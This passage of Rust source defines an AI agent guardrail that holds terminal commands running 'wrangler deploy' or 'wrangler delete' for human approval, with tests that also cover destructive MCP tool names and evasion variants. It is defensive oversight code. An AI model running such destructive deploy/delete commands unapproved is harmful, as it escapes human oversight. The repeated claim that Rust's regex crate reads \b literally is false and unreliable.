/// is auto-`Allow` on the LLM tool-call path (agent_loop.rs groups `Allow | Warn` into
/// execute-immediately). This guardrail mirrors [`McpMutationGuardrail`] structurally but
/// targets the `terminal` tool's `command` argument instead of MCP tool names, and always
/// returns [`GuardrailDecision::NeedsApproval`] — **never** `Warn` — so the deploy/delete
/// path is forced through the Phase 45 approval gate + Phase 46 audit before any subprocess
/// runs.
///
/// Scoped to `wrangler deploy`/`wrangler delete` only (D-07's UAT target). Broader
/// wrangler-subcommand coverage (kv/r2/d1 delete) is a documented v1.1 follow-up.
///
/// **NEVER use `\b`** — the Rust `regex` crate treats `\b` as two literal chars, not a
/// word-boundary assertion (T-45-03 precedent). Negative-character-class boundaries are
/// used instead so evasions like double-space, leading command prefix (`npx wrangler
/// deploy`), or trailing args cannot slip past the gate.
pub struct WranglerMutationGuardrail {
    pattern: Regex,
}

impl WranglerMutationGuardrail {
    /// Create a guardrail with the built-in wrangler deploy/delete pattern compiled once.
    pub fn new() -> Self {
        let pattern =
            Regex::new(r"(?:^|[^a-zA-Z0-9_])wrangler\s+(?:deploy|delete)(?:[^a-zA-Z0-9_]|$)")
                .expect("WranglerMutationGuardrail: invalid built-in pattern");
        Self { pattern }
    }
}

impl Default for WranglerMutationGuardrail {
    fn default() -> Self {
        Self::new()
    }
}

impl GuardrailHook for WranglerMutationGuardrail {
    /// Classify a tool call before dispatch.
    ///
    /// - Non-`terminal` tool → [`GuardrailDecision::Allow`] (only gates the terminal tool).
    /// - `terminal` call with no `command` argument → [`GuardrailDecision::Allow`].
    /// - `terminal` call whose `command` matches `wrangler deploy`/`wrangler delete` →
    ///   [`GuardrailDecision::NeedsApproval`] (D-11).
    /// - Any other `terminal` command → [`GuardrailDecision::Allow`].
    fn check(&self, tool_name: &str, args: &serde_json::Value) -> GuardrailDecision {
        if tool_name != "terminal" {
            return GuardrailDecision::Allow;
        }
        let Some(command) = args.get("command").and_then(|v| v.as_str()) else {
            return GuardrailDecision::Allow;
        };
        if self.pattern.is_match(command) {
            return GuardrailDecision::NeedsApproval {
                reason: format!(
                    "wrangler destructive/deploy command — approval required: {command}"
                ),
            };
        }
        GuardrailDecision::Allow
    }

    fn name(&self) -> &str {
        "wrangler-mutation"
    }
}

// ---------------------------------------------------------------------------
// Tests — McpMutationGuardrail (EXEC-05-a..d)
// ---------------------------------------------------------------------------

#[cfg(test)]
mod guardrail_mcp_tests {
    use super::{DEFAULT_VERBS, GuardrailDecision, GuardrailHook, McpMutationGuardrail};

    /// EXEC-05-a: destructive prefixed MCP tool → NeedsApproval.
    #[test]
    fn mcp_mutation_guardrail() {
        let g = McpMutationGuardrail::new();
        let decision = g.check(
            "cloudflare_bindings__kv_bulk_delete",
            &serde_json::Value::Null,
        );
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "destructive MCP tool must NeedsApproval, got: {decision:?}"
        );
    }

    /// EXEC-05-b: local tool without `__` → Allow.
    #[test]
    fn mcp_mutation_allow_local() {
        let g = McpMutationGuardrail::new();
        let decision = g.check("terminal", &serde_json::Value::Null);
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "local tool must Allow, got: {decision:?}"
        );
    }

    /// EXEC-05-c: read-only prefixed MCP tool → Allow.
    #[test]
    fn mcp_mutation_allow_read() {
        let g = McpMutationGuardrail::new();
        let decision = g.check("cloudflare_bindings__kv_get", &serde_json::Value::Null);
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "read-only MCP tool must Allow, got: {decision:?}"
        );
    }

    /// EXEC-05-d: no DEFAULT_VERB pattern contains the Rust-regex word-boundary literal.
    ///
    /// The `regex` crate treats `\b` as two literal characters (backslash + b), NOT a
    /// word-boundary assertion. Using it would silently fail to match (T-45-03).
    #[test]
    fn regex_no_word_boundary() {
        let g = McpMutationGuardrail::new();
        for pattern in &g.patterns {
            let src = pattern.as_str();
            assert!(
                !src.contains("\\b"),
                "pattern contains the Rust-regex word-boundary literal \\b (T-45-03): {src}"
            );
        }
        // Also assert DEFAULT_VERBS drives the pattern count
        assert_eq!(
            g.patterns.len(),
            DEFAULT_VERBS.len(),
            "pattern count must match DEFAULT_VERBS length"
        );
    }

    /// LO-02: a destructive verb in a NON-final `__` segment must still be caught.
    ///
    /// The old code used `rsplit("__").next()` (final segment only), so
    /// `srv__delete__wrapper` was checked against `"wrapper"` and slipped through.
    /// The fix matches the whole remainder after the FIRST `__`
    /// (`splitn(2, "__").nth(1)` → `"delete__wrapper"`), catching the verb.
    #[test]
    fn mcp_mutation_verb_in_nonfinal_segment() {
        let g = McpMutationGuardrail::new();
        let decision = g.check("srv__delete__wrapper", &serde_json::Value::Null);
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "LO-02: destructive verb in a non-final __ segment must NeedsApproval, got: {decision:?}"
        );
    }
}

// ---------------------------------------------------------------------------
// Tests — WranglerMutationGuardrail (Phase 46, D-06/D-07)
// ---------------------------------------------------------------------------

#[cfg(test)]
mod wrangler_mutation_tests {
    use super::{GuardrailDecision, GuardrailHook, WranglerMutationGuardrail};

    fn command_args(command: &str) -> serde_json::Value {
        serde_json::json!({ "command": command })
    }

    #[test]
    fn wrangler_deploy_needs_approval() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler deploy"));
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "wrangler deploy must NeedsApproval, got: {decision:?}"
        );
    }

    #[test]
    fn wrangler_delete_needs_approval() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler delete my-worker"));
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "wrangler delete must NeedsApproval, got: {decision:?}"
        );
    }

    /// Leading command prefix (e.g. `npx wrangler deploy`) must not evade the gate.
    #[test]
    fn npx_wrangler_deploy_needs_approval() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("npx wrangler deploy"));
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "npx wrangler deploy must NeedsApproval (leading prefix must not evade), got: {decision:?}"
        );
    }

    /// Double-space between `wrangler` and `deploy` must not evade the gate.
    #[test]
    fn double_space_wrangler_deploy_needs_approval() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler  deploy"));
        assert!(
            matches!(decision, GuardrailDecision::NeedsApproval { .. }),
            "wrangler  deploy (double space) must NeedsApproval, got: {decision:?}"
        );
    }

    #[test]
    fn wrangler_tail_allowed() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler tail"));
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "wrangler tail is non-destructive, must Allow, got: {decision:?}"
        );
    }

    #[test]
    fn wrangler_whoami_allowed() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &command_args("wrangler whoami"));
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "wrangler whoami is non-destructive, must Allow, got: {decision:?}"
        );
    }

    /// Only the `terminal` tool is gated — other tool names always Allow.
    #[test]
    fn non_terminal_tool_allowed() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("some_other_tool", &command_args("wrangler deploy"));
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "non-terminal tool must Allow regardless of command, got: {decision:?}"
        );
    }

    #[test]
    fn missing_command_allowed() {
        let g = WranglerMutationGuardrail::new();
        let decision = g.check("terminal", &serde_json::Value::Null);
        assert_eq!(
            decision,
            GuardrailDecision::Allow,
            "missing command key must Allow, got: {decision:?}"
        );
        let decision_empty_obj = g.check("terminal", &serde_json::json!({}));
        assert_eq!(
            decision_empty_obj,
            GuardrailDecision::Allow,
            "empty args object must Allow, got: {decision_empty_obj:?}"
        );
    }

    /// T-45-03 regression guard: the pattern must never contain the Rust-regex
    /// word-boundary literal `\b` (two literal chars in the `regex` crate, not an
    /// assertion) — negative-character-class boundaries only.
    #[test]
    fn regex_no_word_boundary() {
        let g = WranglerMutationGuardrail::new();
        let src = g.pattern.as_str();
        assert!(
            !src.contains("\\b"),
            "pattern contains the Rust-regex word-boundary literal \\b (T-45-03): {src}"
        );
    }

    #[test]
    fn name_is_wrangler_mutation() {
        let g = WranglerMutationGuardrail::new();
        assert_eq!(g.name(), "wrangler-mutation");
    }
}
